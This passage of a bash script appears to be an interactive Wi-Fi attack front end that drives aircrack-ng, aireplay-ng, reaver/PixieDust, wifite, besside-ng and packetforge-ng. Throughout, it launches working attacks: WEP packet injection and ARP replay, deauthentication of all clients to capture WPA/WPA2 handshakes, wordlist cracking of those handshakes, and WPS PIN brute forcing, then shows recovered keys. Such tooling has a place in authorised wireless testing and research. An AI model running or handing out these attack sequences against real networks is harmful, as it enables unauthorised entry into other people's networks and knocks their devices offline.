	$terminal aireplay-ng -1 0 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &
	
	# Alt
	#$terminal aireplay-ng -1 6000 -o 1 -q 10 -a $bssid -h $macAddressMonitor -e "$essid" $interfaceMonitor &

}


arAttackInteractive(){

	currentTask="arAttackInteractive"

	$terminal aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -a $bssid -h $macAddressMonitor $interfaceMonitor &

}


arAttackArpReplay(){

	currentTask="arAttackArpReplay"

	$terminal aireplay-ng -3 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &

}


arAttackChopChop(){

	currentTask="arAttackChopChop"

	#$terminal aireplay-ng -4 -a $bssid -h $macAddressMonitor $interfaceMonitor &
	$terminal aireplay-ng -4 -h $macAddressMonitor -b $bssid $interfaceMonitor &
	
	# Unauthenticated Method
	#$terminal aireplay-ng -4 -b $bssid $interfaceMonitor &

}


arAttackFragment(){

	currentTask="arAttackFragment"

	$terminal aireplay-ng -5 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &

}


arAttackCaffeLatte(){

	currentTask="arAttackCaffeLatte"

	$terminal aireplay-ng -6 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &

}


arAttackCfrag(){

	currentTask="arAttackCfrag"

	$terminal aireplay-ng -7 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &

}


arAttackMigMode(){

	currentTask="arAttackMigMode"

	$terminal aireplay-ng -8 -e $essid -b $bssid -h $macAddressMonitor $interfaceMonitor &

}


arAttackTest(){

	currentTask="arAttackTest"

	$terminal aireplay-ng -9 -e $essid -a $bssid -h $macAddressMonitor $interfaceMonitor &

}

aircrackDecryptWEP(){

	currentTask="aircrackDecryptWEP"

	banner
	bannerStats

	echo ""
	echo "Preparing capture files for aircrack-ng...."
	echo ""
	echo ""

	findCaptureFiles

	#echo "$listCap"
	#echo "$listIvs"
	#read pause

	killAircrack

	aircrack-ng -a $acMode -e "$essid" -b $bssid -l "key_$essid" $listCap $listIvs&
	#aircrack-ng -e "$essid" -b $bssid -l "key_$essid" *.cap *.ivs&
	#aircrack-ng -l "key_$essid" *.cap *.ivs&
	#'aircrack-ng' " -l" "$capturePath/$encryptionType/key_$essid" "$capturePath/$encryptionType/*.cap" "$capturePath/$encryptionType/*.ivs"&

	# Killing aircrack-ng to stop auto-checking from overlapping WEP Attack menu
	killAircrack

	#echo ""
	#echo ""
	#echo ""
	#echo "FOUND KEY: "
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to return to Attacks Menu...."
	echo ""
	echo ""

	read acPause

	menuAttacksWEP

}


############################################################################
#   ATTACKS: WEP END   #####################################################
############################################################################





############################################################################
#   ATTACKS: WPA BEGIN   ###################################################
############################################################################


autoModeNoPreviousSessionWPA(){

	currentTask="autoModeNoPreviousSessionWPA"

	adAPScanNoChannel

	doSleepMessage "Setting Up User Input...." "2"

	getESSID
	getBSSID
	getChannel

	sessionWriteBeginNew
	sessionCopyNewCaptureFiles

	doSleepMessage "Killing Airodump Window...." "2"


	killAirodump


	menuAttacksWPA

	echo ""
	echo ""
	echo "Press any key to continue...."
	echo ""
	echo ""

	read pause

}


autoModeUsePreviousSessionWPA(){

	currentTask="autoModeUsePreviousSessionWPA"

	sessionWriteLoadPrevious

	menuAttacksWPA


	echo ""
	echo ""
	echo "Press any key to continue...."
	echo ""
	echo ""

	read pause

}


menuAttacksWPA(){

	currentTask="menuAttacksWPA"

	banner
	bannerStats

	# Only run a deauth with default text and settings if not re-forced through menu
	case "$retryDeauth" in

		"0")
		killAll

		adFileDump

		doSleepMessage "Preparing to Capture WPA Handshake...." "2"

		arAttackDeAuth
		captureHandshakeWPA
		;;

		"1")
		doSleepMessage "Preparing to De-Authenticate All Connected Stations...." "1"
		arAttackDeAuth
		captureHandshakeWPA
		;;
	esac

}


aircrackDecryptWPA(){

	currentTask="aircrackDecryptWPA"
	lastMenuID="aircrackDecryptWPA"

	banner
	bannerStats

	doSleepMessage "Preparing captured handshake for aircrack-ng...." "4"

	banner
	bannerStats

	echo ""
	echo "You need a wordlist to crack the key!"
	echo ""
	echo "Current List Loaded:"
	echo ""
	$green
	echo "$wordlist"
	$white
	echo ""
	echo "You may press C and ENTER to load a custom list"
	echo ""
	echo ""
	echo "Another Example Wordlist Collection:"
	echo "https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm"
	echo ""
	echo ""
	echo "You may also press B and ENTER to run a besside-ng attack"
	echo ""
	echo ""
	echo "Press ENTER once you have a valid wordlist ready!"
	echo ""
	echo ""

	read tmpPause

	hotkeyInput="$tmpPause"

	loadMenuHotkeys "$hotkeyInput"

	case "$tmpPause" in

		"")
		$terminal aircrack-ng -w "$wordlist" -b $bssid *.cap
		;;

		"C" | "c")
		getCustomList
		;;

		"B" | "b")
		bessideMain
		;;

	esac

	banner
	bannerStats

	#echo ""
	#echo ""
	#echo ""
	#echo "FOUND KEY: "
	echo ""
	echo "WPA Attack Is Currently Running!"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	$red
	echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
	echo ""
	echo ""
	$white
	echo "Press ENTER to restart attack or use an option from Top Navigation Bar...."
	echo ""
	echo ""
	$red
	echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
	$white
	echo ""
	echo ""

	read acPause

	hotkeyInput="$acPause"

	loadMenuHotkeys "$hotkeyInput"

	case "$acPause" in

		"")
		killAll
		menuAttacksWPA
		;;

	esac

}


captureHandshakeWPA(){

	currentTask="captureHandshakeWPA"
	lastMenuID="captureHandshakeWPA"

	banner
	bannerStats

	echo ""
	echo "The airodump window is open. Look in top right hand corner for the handshake"
	echo ""
	echo "Once handshake is complete, you may close the airodump window."
	echo ""
	echo ""
	$green
	echo "Example: [ WPA handshake: $bssid ]"
	$white
	echo ""
	echo ""
	echo ""
	echo "To force another DEAUTH for HANDSHAKE press D and ENTER!"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to continue once handshake is made...."
	echo ""
	echo ""

	read captureHandshake

	hotkeyInput="$captureHandshake"

	loadMenuHotkeys "$hotkeyInput"

	case "$captureHandshake" in

		"")
		killAirodump
		killAireplay

		doSleepMessage "Preparing capture files for aircrack-ng...." "2"

		aircrackDecrypt
		;;

		"D" | "d")
		retryDeauth="1"
		menuAttacksWPA
		;;

		*)
		menuAttacksWPA
		;;

	esac

}


menuAttacksWPAWifiteAuto(){

	currentTask="menuAttacksWPAWifiteAuto"
	lastMenuID="menuAttacksWPAWifiteAuto"

	killAll

	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
	$terminal $wifiteAttackWPA &

	banner
	bannerStats

	echo ""
	echo "The wifite session should be launched in a separate window."
	echo ""
	echo ""
	echo ""
	echo ""
	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
	echo ""
	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
	echo ""

	read pause

	sessionCopyNewCaptureFiles

	killAll
	menuAuto

}


############################################################################
#   ATTACKS: WPA END   #####################################################
############################################################################





############################################################################
#   ATTACKS: WPA2 BEGIN   ##################################################
############################################################################


autoModeNoPreviousSessionWPA2(){

	currentTask="autoModeNoPreviousSessionWPA2"

	adAPScanNoChannel

	doSleepMessage "Setting Up User Input...." "2"

	getESSID
	getBSSID
	getChannel

	sessionWriteBeginNew
	sessionCopyNewCaptureFiles

	doSleepMessage "Killing Airodump Window...." "2"


	killAirodump

	menuAttacksWPA2

	echo ""
	echo ""
	echo "Press any key to continue...."
	echo ""
	echo ""

	read pause

}


autoModeUsePreviousSessionWPA2(){

	currentTask="autoModeUsePreviousSessionWPA2"

	sessionWriteLoadPrevious

	menuAttacksWPA2

	echo ""
	echo ""
	echo "Press any key to continue...."
	echo ""
	echo ""

	read pause

}


menuAttacksWPA2(){

	currentTask="menuAttacksWPA2"

	banner
	bannerStats

	# Only run a deauth with default text and settings if not re-forced through menu
	case "$retryDeauth" in

		"0")
		killAll

		adFileDump

		doSleepMessage "Preparing to Capture WPA Handshake...." "2"

		arAttackDeAuth
		captureHandshakeWPA2
		;;

		"1")
		doSleepMessage "Preparing to De-Authenticate All Connected Stations...." "1"
		arAttackDeAuth
		captureHandshakeWPA2
		;;
	esac

}


aircrackDecryptWPA2(){

	currentTask="aircrackDecryptWPA2"
	lastMenuID="aircrackDecryptWPA2"

	banner
	bannerStats

	doSleepMessage "Preparing captured handshake for aircrack-ng...." "4"

	banner
	bannerStats

	echo ""
	echo "You need a wordlist to crack the key!"
	echo ""
	echo "Current List Loaded:"
	echo ""
	$green
	echo "$wordlist"
	$white
	echo ""
	echo "You may press C and ENTER to load a custom list"
	echo ""
	echo ""
	echo "Another Example Wordlist Collection:"
	echo "https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm"
	echo ""
	echo ""
	echo "You may also press B and ENTER to run a besside-ng attack"
	echo ""
	echo ""
	echo "Press ENTER once you have a valid wordlist ready!"
	echo ""
	echo ""

	read tmpPause

	hotkeyInput="$tmpPause"

	loadMenuHotkeys "$hotkeyInput"

	case "$tmpPause" in

		"")
		$terminal aircrack-ng -w "$wordlist" -b $bssid *.cap
		;;

		"C" | "c")
		getCustomList
		;;

		"B" | "b")
		bessideMain
		;;

	esac

	banner
	bannerStats

	#echo ""
	#echo ""
	#echo ""
	#echo "FOUND KEY: "
	echo ""
	echo "WPA2 Attack Is Currently Running!"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	$red
	echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
	echo ""
	echo ""
	$white
	echo "Press ENTER to restart attack or use an option from Top Navigation Bar...."
	echo ""
	echo ""
	$red
	echo "*** WARNING! RESTARTING THE ATTACK WILL ALSO TERMINATE THE AIRCRACK WINDOW! ***"
	$white
	echo ""
	echo ""

	read acPause

	hotkeyInput="$acPause"

	loadMenuHotkeys "$hotkeyInput"

	case "$acPause" in

		"")
		killAll
		menuAttacksWPA2
		;;

	esac

}


captureHandshakeWPA2(){

	currentTask="captureHandshakeWPA2"
	lastMenuID="captureHandshakeWPA2"

	banner
	bannerStats

	echo ""
	echo "The airodump window is open. Look in top right hand corner for the handshake"
	echo ""
	echo "Once handshake is complete, you may close the airodump window."
	echo ""
	echo ""
	$green
	echo "Example: [ WPA handshake: $bssid ]"
	$white
	echo ""
	echo ""
	echo ""
	echo "To force another DEAUTH for HANDSHAKE press D and ENTER!"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to continue once handshake is made...."
	echo ""
	echo ""

	read captureHandshake

	hotkeyInput="$captureHandshake"

	loadMenuHotkeys "$hotkeyInput"

	case "$captureHandshake" in

		"")
		killAirodump
		killAireplay

		doSleepMessage "Preparing capture files for aircrack-ng...." "2"

		aircrackDecrypt
		;;

		*)
		menuAttacksWPA2
		;;

	esac

}


menuAttacksWPA2WifiteAuto(){

	currentTask="menuAttacksWPA2WifiteAuto"
	lastMenuID="menuAttacksWPA2WifiteAuto"

	killAll

	#$terminal $wifiteAttackWEP -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
	$terminal $wifiteAttackWPA2 &

	banner
	bannerStats

	echo ""
	echo "The wifite session should be launched in a separate window."
	echo ""
	echo ""
	echo ""
	echo ""
	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
	echo ""
	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
	echo ""

	read pause

	sessionCopyNewCaptureFiles

	killAll
	menuAuto

}


############################################################################
#   ATTACKS: WPA2 END   ####################################################
############################################################################





############################################################################
#   ATTACKS: WPS BEGIN   ###################################################
############################################################################


autoModeNoPreviousSessionWPS(){

	currentTask="autoModeNoPreviousSessionWPS"

	#adAPScanWifiteWPSNoChannel
	#adAPScanNoChannel
	adAPScanNoChannelWPS

	doSleepMessage "Preparing Text List of Available Targets...." "15"

	doSleepMessage "Setting Up User Input...." "2"

	getESSID
	getBSSID
	getChannel

	sessionWriteBeginNew
	sessionCopyNewCaptureFiles

	doSleepMessage "Killing Airodump Window...." "2"


	killAirodump
	killWash
	killWifite

	getBSSIDCharOnly

	# Choose WPS Attack Method
	case "$attackMethodWPS" in

		"reaver")
		reaverSaveAllSessionFiles
		menuAttacksWPS
		;;

		"bully")
		menuBullyMain
		;;

	esac

}


autoModeUsePreviousSessionWPS(){

	currentTask="autoModeUsePreviousSessionWPS"

	sessionWriteLoadPrevious

	menuAttacksWPS

}


menuAttacksWPS(){

	currentTask="menuAttacksWPS"

	banner
	bannerStats

	# Set Default Choice
	pixieChoice="1"

	echo ""
	echo "1) Continue With PixieDust ENABLED (Recommended)"
	echo ""
	echo "2) Continue With PixieDust DISABLED"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Choose an Option and Press ENTER to continue"
	echo ""
	echo ""
	echo ""
	$green
	echo "If No Selection Is Made, It Will Continue Automatically Using PixieDust"
	$white
	echo ""
	echo ""
	echo "Continuing In 10 Seconds...."
	echo ""
	echo ""

	read -t 10 pixieChoice

	hotkeyInput="$pixieChoice"

	loadMenuHotkeys "$hotkeyInput"

	case "$pixieChoice" in

		"")
		#menuAttacksWPS
		pixieChoice="1"
		sleepMessage1="Preparing Reaver/PixieDust Session...."
		sleepMessage2="Launching Reaver/PixieDust Session...."
		sleepMessage3="Reaver Session Sprinkled With PixieDust Is Now Active!"
		;;

		"1")
		pixieChoice="1"
		sleepMessage1="Preparing Reaver/PixieDust Session...."
		sleepMessage2="Launching Reaver/PixieDust Session...."
		sleepMessage3="Reaver Session Sprinkled With PixieDust Is Now Active!"
		;;

		"2")
		pixieChoice="2"
		sleepMessage1="Preparing Reaver Session...."
		sleepMessage2="Launching Reaver Session...."
		sleepMessage3="Reaver Session Is Now Active!"
		;;

		*)
		menuAttacksWPS
		;;

	esac

	doSleepMessage "$sleepMessage1" "1"

	killAirodump
	killWash

	disableChannelHopping

	doSleepMessage "$sleepMessage1" "1"

	doSleepMessage "$sleepMessage2" "2"

	banner
	bannerStats

	doSleepMessage "$sleepMessage3" "0" "$green"
	$white
	echo ""
	echo "Press CTRL+C At Any Time To Stop Current Session and Save"
	sleep 2

	case "$pixieChoice" in
	
		"1")
		#echo "PixeDust Enabled"
		#$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv -K $pixieNumber
		$reaver -i $interfaceMonitor -b $bssid -c $channel -vv -K $pixieNumber
		#read pause
		#pixieFailed="1"

		reaverSessionComplete

		case "$pixieFailed" in
	
			"1")
			banner
			bannerStats
			echo "Pixie Attack Failed! Starting Normal Reaver Attack"
			echo ""
			echo ""
			$white
			reaverMenuAttacksWPS
			;;

		esac
		;;
	
		"2")
		#echo "PixeDust Disabled"
		#$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv
		#$reaver -i $interfaceMonitor -b $bssid -c $channel -vv

		reaverMenuAttacksWPS
		;;

	esac

}


reaverMenuAttacksWPS(){

	currentTask="reaverMenuAttacksWPS"

	banner
	bannerStats

	sleepMessage1="Preparing Reaver Session...."
	sleepMessage2="Launching Reaver Session...."
	sleepMessage3="Reaver Session Is Now Active!"

	doSleepMessage "$sleepMessage1" "1"

	killAirodump
	killWash

	disableChannelHopping

	doSleepMessage "$sleepMessage1" "1"

	doSleepMessage "$sleepMessage2" "1"

	banner
	bannerStats

	doSleepMessage "$sleepMessage3" "0" "$green"
	$white
	echo ""
	echo "Press CTRL+C At Any Time To Stop Current Session and Save"
	sleep 2
	
	$reaver -i $interfaceMonitor -b $bssid -c $channel -S -vv

	# Set pixieChoice To 0 For Triggering Normal Reaver Save Session Screen
	pixieChoice="0"

	reaverSessionComplete

}


reaverSessionComplete(){

	currentTask="reaverSessionComplete"

	# Session has ended lands here
	getBSSIDCharOnly

	echo ""
	$lightBlue
	echo "***************************************"
	echo "** SCROLL UP FOR RECOVERED PASSWORD ***"
	echo "***************************************"
	echo ""
	#$magenta
	#echo "Attempting To Save Reaver Session...."
	#echo ""
	#echo "** Will Give Error If No Session Has Been Written **"
	#echo ""
	reaverSaveCurrentSessionFile

	$green
	echo ""
	echo "***************************************"
	echo "* Your reaver session has been saved! *"
	echo "***************************************"
	$white
	echo ""
	$yellow

	# Check if PixieDust was used
	case "$pixieChoice" in

		"0")
		echo "If the key is available, now would be a good time to do the following:"
		echo ""
		echo "- Write down or take a picture of the WPA/WPA2 key and/or WPS pin"
		echo ""
		echo ""
		$cyan
		echo "** YOU MAY NEED TO SCROLL UP TO SEE THE PASSPHRASE / PIN / ESSID **"
		$white
		echo ""
		echo ""
		echo ""
		echo ""
		echo ""
		echo "Press ENTER to continue...."
		echo ""

		read pause
		;;

		"1")
		echo "If the key is available, now would be a good time to do the following:"
		echo ""
		echo "- Write down or take a picture of the WPA/WPA2 key and/or WPS pin"
		echo ""
		echo ""
		$cyan
		echo "** YOU MAY NEED TO SCROLL UP TO SEE THE PASSPHRASE / PIN / ESSID **"
		echo ""
		$cyan
		echo "* IF PIXIEDUST ATTACK FAILED, USE THE \"R\" OPTION TO START NORMAL REAVER ATTACK *"
		$white
		echo ""
		echo ""
		echo ""
		echo "Press ENTER to continue or type \"R\" to start normal Reaver attack...."
		echo ""

		read pixiePost

		case "$pixiePost" in
		
			"R" | "r")
			banner
			bannerStats
			echo "Pixie Attack Failed! Starting Normal Reaver Attack"
			echo ""
			echo ""
			$white
			reaverMenuAttacksWPS
			;;

		esac
		;;

	esac

	menuMain

}

menuAttacksWPSWifiteAuto(){

	currentTask="menuAttacksWPSWifiteAuto"
	lastMenuID="menuAttacksWPSWifiteAuto"

	killAll

	#$terminal $wifiteAttackWPS -c $channel -b $bssid -e $essid -wepsave -wepca 1000 &
	$terminal $wifiteAttackWPS &

	banner
	bannerStats

	echo ""
	echo "The wifite session should be launched in a separate window."
	echo ""
	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
	echo ""
	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
	echo ""

	read pause

	echo ""
	echo ""
	echo "Your wifite session has been saved!"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "If the key is available, now would be a good time to do the following:"
	echo ""
	echo "1) Write down the WPA/WPA2 key and/or WPS pin"
	echo ""
	echo "2) Take a picture of the screen to keep a record of the keys"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to continue...."
	echo ""
	echo ""

	killAll
	menuAuto

	read pause

}


aircrackDecryptWPS(){

	# NOT ACTUALLY USED FOR WPS ATTACK

	currentTask="aircrackDecryptWPS"

	blank=""

}


reaverSaveCurrentSessionFile(){

	currentTask="reaverSaveCurrentSessionFile"

	# Use current session path and bssid to build variable
	reaverCurrentSessionFile="../../$reaverSessionPath/$bssidCharOnly.wpc"

	# Check BSSID and only continue if not blank
	if [ "$bssidCharOnly" != "" ];then

		# Check to see if reaver session file exists
		if [ -e $reaverCurrentSessionFile ];then
			
			# Copy reaver session file to current WPS sessions directory
			cp "$reaverCurrentSessionFile" "$capturePathWPS"

		fi

	fi

}


reaverSaveAllSessionFiles(){

currentTask="reaverSaveCurrentSessionFile"

	# Check BSSID and only continue if not blank
	if [ "$bssidCharOnly" != "" ];then

		cp "../../$reaverSessionPath/*.wpc" "$capturePathWPS"

	fi

}


menuBullyMain() {

	currentTask="menuBullyMain"

	banner
	echo ""
	echo "Bully WPS Attack Menu"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Choose an option and press ENTER:"
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""
	echo ""

	read pause

}


menuWashMain() {

	#currentTask="menuWashMain"

	banner
	echo ""
	echo "WPS Wash Menu"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "Choose an option and press ENTER:"
	echo ""
	echo ""
	echo ""
	echo "1) Use Defaults"
	echo ""
	echo "2) Enter Channel Number"
	echo ""
	echo "3) Toggle Scan Mode"
	echo ""
	echo "4) Use 5GHz Band"
	echo ""
	echo "5) Do Not Ignore Frame Checksum Errors"
	echo ""
	echo ""
	echo ""
	echo ""
	echo "R) Return To Previous Page"
	echo ""
	echo ""

	read washOption

	case "$washOption" in

		"1")
		wash -i $interfaceMonitor -o "$washFile" -C
		;;

		"2")
		wash -i $interfaceMonitor -o "$washFile" -C -c $washChannel
		;;

		"3")
		wash -i $interfaceMonitor -o "$washFile" -C -s
		;;

		"4")
		wash -i $interfaceMonitor -o "$washFile" -C -5
		;;

		"5")
		wash -i $interfaceMonitor -o "$washFile"
		;;

		"6")
		currentTask
		;;

	esac

}



############################################################################
#   ATTACKS: WPS END   #####################################################
############################################################################




############################################################################
#   ATTACKS: UNIVERSAL BEGIN   #############################################
############################################################################

menuAttacksAllWifiteAuto(){

	currentTask="menuAttacksAllWifiteAuto"
	lastMenuID="menuAttacksAllWifiteAuto"

	killAll

	$terminal $wifiteAttackAll &

	banner
	bannerStats

	echo ""
	echo "The wifite session should be launched in a separate window."
	echo ""
	echo "PRESS ENTER ONLY WHEN THE SESSION HAS FINISHED!"
	echo ""
	echo "AS SOON AS ENTER IS PRESSED THE WIFITE SESSION WILL BE RESET!"
	echo ""

	read pause

	killAll
	menuMain

}


generateArpPacket(){

	currentTask="generateArpPacket"

	$terminal aireplay-ng -4 $interfaceMonitor &
	
	# Alt
	$terminal aireplay-ng -4 -h $macAddressMonitor $interfaceMonitor &

}


tcpDump(){

	currentTask="tcpDump"

	# Accepts a CAP file as INPUT
	$terminal tcpdump -s 0 -n -e -r $1 &
	
}


forgeArpRequest(){

	currentTask="forgeArpRequest"

	# Accepts an XOR file as INPUT
	#packetforge-ng -0 -a $bssid -h $macAddressMonitor -k 192.168.1.2 -l 192.168.1.100 -y $1 -w "$initPath/$bssid-arp.cap" &

	# Accepts an XOR file as INPUT and a CAP file as OUTPUT
	packetforge-ng -0 -a $bssid -h $macAddressMonitor -k 192.168.1.2 -l 192.168.1.100 -y $1 -w $2 &

}


replayArpRequest(){

	currentTask="replayArpRequest"

	aireplay-ng -2 -r "$initPath/$bssid-arp.cap" $interfaceMonitor &

	# Accepts a CAP file as INPUT
	#aireplay-ng -2 -r $1 $interfaceMonitor &

}



############################################################################
#   ATTACKS: UNIVERSAL END   ###############################################
############################################################################




############################################################################
#   BESSIDE-NG STUFF BEGIN   ###############################################
############################################################################


bessideMain(){

	currentTask="bessideMain"

	banner
	bannerStats

	echo ""
	echo "Select a mode and press ENTER:"
	echo ""
	echo ""
	echo "1) Normal"
	echo ""
	echo "2) WPA Only"
	echo ""
	echo "3) Upload"
	echo ""
	echo "4) Set Flood Rate"
	echo ""
	echo "5) Return To Previous Menu"
	echo ""
	echo ""

	read getBessideMode

	hotkeyInput="$getBessideMode"

	loadMenuHotkeys "$hotkeyInput"

	case "$getBessideMode" in

		"")
		bessideMain
		;;

		"1")
		bessideNormal
		;;

		"2")
		bessideWPAOnly
		;;

		"3")
		bessideUpload
		;;

		"4")
		bessideSetFloodRate
		;;

		"5")
		$lastMenuID
		;;

		*)
		bessideMain
		;;

	esac

}


bessideNormal(){

	currentTask="bessideNormal"

	$terminal besside-ng -b $bssid -c $channel -vv $interfaceMonitor

}


bessideUpload(){

	currentTask="bessideUpload"

	$terminal besside-ng -b $bssid -c $channel -s $serverWPA -vv $interfaceMonitor

}


bessideWPAOnly(){

	currentTask="bessideWPAOnly"

	$terminal besside-ng -b $bssid -c $channel -W -vv $interfaceMonitor

}


bessideSetFloodRate(){

	currentTask="bessideSetFloodRate"

	bessideFloodRate=""

}


############################################################################
#   BESSIDE-NG STUFF END   #################################################
############################################################################




############################################################################
#   POST EXPLOITATION BEGIN   ##############################################
############################################################################






############################################################################
#   POST EXPLOITATION END   ################################################
############################################################################




############################################################################
#   PROCESS MANAGEMENT BEGIN   #############################################
############################################################################


killProcesses(){

	currentTask="killProcesses"

	killall NetworkManager
	killall NetworkManagerDispatcher
	#killall wpa_supplicant
	#killall avahi-daemon

}


restartProcesses(){

	currentTask="restartProcesses"

	#killall NetworkManager
	NetworkManager

	#killall NetworkManagerDispatcher
	NetworkManagerDispatcher

	#wpa_supplicant
	#avahi-daemon

}


killWifite(){

	currentTask="killWifite"

	findWifitePID=$(ps -A | grep "wifite" | head -c5)

	case "$findWifitePID" in

		"")
		# No Process Found
		;;

		*)
		killWifiteTemp=$(kill $findWifitePID)
		;;
	esac
	

}


killAirodump(){

	currentTask="killAirodump"

	findAirodumpPID=$(ps -A | grep "airodump-ng" | head -c5)

	case "$findAirodumpPID" in

		"")
		# No Process Found
		;;

		*)
		killAirodumpTemp=$(kill $findAirodumpPID)
		#killAirodumpTemp=$(killall airodump-ng)
		;;
	esac

}


killAireplay(){

	currentTask="killAireplay"

	findAireplayPID=$(ps -A | grep "aireplay-ng" | head -c5)

	case "$findAireplayPID" in

		"")
		# No Process Found
		;;

		*)
		killAireplayTemp=$(kill $findAireplayPID)
		;;
	esac

}


killAircrack(){

	currentTask="killAircrack"

	findAircrackPID=$(ps -A | grep "aircrack-ng" | head -c5)

	case "$findAircrackPID" in

		"")
		# No Process Found
		;;

		*)
		killAircrackTemp=$(kill $findAircrackPID)
		;;
	esac

}


killWash(){

	currentTask="killWash"

	findWashPID=$(ps -A | grep "wash" | head -c5)

	case "$findWashPID" in

		"")
		# No Process Found
		;;

		*)
		killAircrackTemp=$(kill $findWashPID)
		;;
	esac

}


killAll(){

	killAirodump
	killAireplay
	killAircrack
	killWash
	killWifite

}


############################################################################
#   PROCESS MANAGEMENT END   ###############################################
############################################################################





############################################################################
#   SESSIONS STUFF BEGIN   #################################################
############################################################################


cleanSessionFiles(){

	currentTask="cleanSessionFiles"

	banner
	echo ""
	$red
	echo "*** THIS WILL ERASE ALL CURRENT SESSION FILES!!!"
	$white
	echo ""
	echo ""
	echo "If you would like to create a backup before doing this, press B and ENTER"
	echo ""
	echo ""
	echo "If you would like to CANCEL, press C and ENTER"
	echo ""
	echo ""
	echo ""
	echo ""
	$cyan
	echo "Automatically Continuing In 10 Seconds"
	$white
	echo ""
	echo ""

	read -t 10 eraseSessionConfirm

	case "$eraseSessionConfirm" in

		"")
		banner
		echo ""
		echo "Cleaning Session Files...."
		echo ""
		echo ""

		#rm "$capturePath/wep/wep.sessions"
		#rm "$capturePath/wps/wps.sessions"
		#rm "$capturePath/wpa/wpa.sessions"
		#rm "$capturePath/wpa2/wpa2.sessions"

		rm -r "$capturePath"
		sleep 1
		mkdir "$capturePath"

		banner
		echo ""
		echo "Cleaning Session Files...."
		echo ""
		echo ""
		;;

		"c" | "C")
		menuExtras
		;;

		"b" | "B")
		backupFromSessionErase="1"
		backupSessionFiles
		;;

		*)
		cleanSessionFiles
		;;

	esac

}


backupSessionFiles(){

	currentTask="backupSessionFiles"

	backupName="sessions-backup-$displayDate3"
	backupDir="sessions"
	#nextBackupSlot=0

	if [ -f "$backupName.zip" ]; then 
		nextBackupSlot=$((nextBackupSlot+1))
		backupName="$backupName-$nextBackupSlot"
	fi
		

	#echo "$backupName"
	#echo "$nextBackupSlot"
	#read pause

	banner
	echo ""
	echo "Backing Up Session Files To:"
	echo ""
	$cyan
	echo "$backupName...."
	$white
	echo ""
	echo ""

	case "$backupFromCaptureErase" in

		"1")
		sessionCopyNewCaptureFiles
		banner
		echo ""
		sleep 2
		zip -9 -r $backupName $backupDir
		sleep 1
		cleanCaptureFiles
		backupFromCaptureErase="0"
		;;
	esac

	case "$backupFromSessionErase" in

		"0")
		sleep 3
		zip -9 -r $backupName $backupDir
		;;

		"1")
		sleep 2
		zip -9 -r $backupName $backupDir
		sleep 1
		cleanSessionFiles
		backupFromSessionErase="0"
		;;
	esac

}


sessionWriteBeginNew(){

	currentTask="sessionWriteBeginNew"

	getCurrentDateAndTime

	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "***** Begin New Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "Encryption: $encryptionTypeText" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "ESSID: $essid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "BSSID: $bssid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "Channel: $channel" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"

}


sessionWriteLoadPrevious(){

	currentTask="sessionWriteLoadPrevious"

	getCurrentDateAndTime

	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "***** Load Previous Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "Encryption: $encryptionTypeText" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "ESSID: $essid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "BSSID: $bssid" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "Channel: $channel" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"

}


sessionWriteEndCurrent(){

	currentTask="sessionWriteEndCurrent"

	getCurrentDateAndTime

	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "***** End Current Session - $displayDateAndTime *****" >> "$capturePath/$encryptionType/$encryptionType.sessions"
	echo "" >> "$capturePath/$encryptionType/$encryptionType.sessions"

}


